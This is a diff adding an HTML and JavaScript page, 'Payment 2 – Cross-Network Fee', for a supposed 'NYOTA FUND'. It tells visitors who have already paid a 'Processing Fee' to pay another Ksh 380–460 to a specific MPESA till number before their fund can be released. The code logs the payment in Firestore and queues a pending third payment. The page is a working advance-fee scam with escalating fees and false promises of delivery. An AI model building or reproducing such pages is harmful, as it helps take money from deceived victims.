@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment 2 – Cross-Network Fee</title>
+<link rel="stylesheet" href="style.css">
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="firebase-config.js"></script>
+</head>
+<body>
+
+<div class="container">
+  <h2>Step 2: Cross-Network Fee</h2>
+  
+  <p>Thank you for completing your <strong>Processing Fee</strong> payment ✅. 
+  To send your NYOTA FUND to your desired account, you need to pay the Cross-Network Fee. 
+  This ensures your funds are safely transferred to your preferred network.</p>
+
+  <p style="font-size:18px; color:#0a6ebd;">
+    <strong>Why you must pay this fee:</strong><br>
+    - Without it, your NYOTA FUND cannot be transferred.<br>
+    - It guarantees fast and secure delivery within 3 minutes.<br>
+    - The fee depends on your chosen network.
+  </p>
+
+  <h3>Select where your NYOTA FUND will be sent:</h3>
+
+  <form id="networkForm">
+    <label>
+      <input type="radio" name="network" value="Mpesa" data-fee="400" required>
+      1. Safaricom MPESA – Fee: Ksh 400
+    </label><br><br>
+    <label>
+      <input type="radio" name="network" value="AirtelMoney" data-fee="380">
+      2. AirtelMoney – Fee: Ksh 380
+    </label><br><br>
+    <label>
+      <input type="radio" name="network" value="BankAccount" data-fee="460">
+      3. Bank Account – Fee: Ksh 460
+    </label><br><br>
+
+    <p style="font-size:20px; font-weight:bold;">
+      Selected Network Fee: <strong>Ksh <span id="networkFee">---</span></strong>
+    </p>
+
+    <h3>MPESA Payment Instructions:</h3>
+    <ol style="font-size:18px;">
+      <li>Go to <strong>MPESA</strong></li>
+      <li>Select <strong>Lipa na MPESA → Buy Goods and Services</strong></li>
+      <li>Enter Till Number: <strong id="tillNumber">7950334</strong>
+          <button type="button" onclick="copyTill()" style="margin-left:10px;">Copy Till Number</button>
+      </li>
+      <li>Enter the selected fee amount</li>
+      <li>Confirm and enter your MPESA PIN</li>
+    </ol>
+    <img src="till_photo.png" alt="NYOTA FUND MPESA TILL" style="width:220px; margin-top:10px;">
+
+    <h3>Confirm Payment</h3>
+    <input type="text" id="senderName" placeholder="Sender Name" required>
+    <input type="text" id="senderPhone" placeholder="Phone Number" required>
+    <button type="submit">Submit Payment</button>
+  </form>
+</div>
+
+<script>
+const userPhone = localStorage.getItem("userPhone");
+if(!userPhone) window.location.href="register.html";
+
+// Copy Till Number
+function copyTill(){
+  const till = document.getElementById("tillNumber").innerText;
+  navigator.clipboard.writeText(till).then(()=>{
+    alert("Till number copied: "+till);
+  }).catch(err=>{
+    alert("Failed to copy, copy manually.");
+  });
+}
+
+// Ensure first payment exists
+db.collection("users").doc(userPhone).get().then(doc=>{
+  if(!doc.exists || !doc.data().firstPayment){
+    alert("Please complete first payment first.");
+    window.location.href="payment1.html";
+  }
+});
+
+// Update fee when network changes
+document.querySelectorAll('input[name="network"]').forEach(radio=>{
+  radio.addEventListener('change', function(){
+    document.getElementById("networkFee").innerText = this.dataset.fee;
+  });
+});
+
+// Submit form
+document.getElementById("networkForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  const selected = document.querySelector('input[name="network"]:checked');
+  const senderName = document.getElementById("senderName").value.trim();
+  const senderPhone = document.getElementById("senderPhone").value.trim();
+
+  if(!selected){
+    alert("Select a network to continue");
+    return;
+  }
+
+  if(senderName.length < 2 || senderPhone.length < 10){
+    alert("Enter valid sender name and phone");
+    return;
+  }
+
+  db.collection("users").doc(userPhone).update({
+    secondPayment: {
+      amount: parseInt(selected.dataset.fee),
+      network: selected.value,
+      senderName,
+      senderPhone,
+      submittedAt: new Date(),
+      status: "submitted"
+    },
+    thirdPayment: {
+      required: true,
+      status: "pending"
+    }
+  }).then(()=>{
+    window.location.href="payment3.html";
+  }).catch(err=>{
+    alert("Error submitting payment. Try again.");
+    console.error(err);
+  });
+});
+</script>
+
+</body>
+</html>
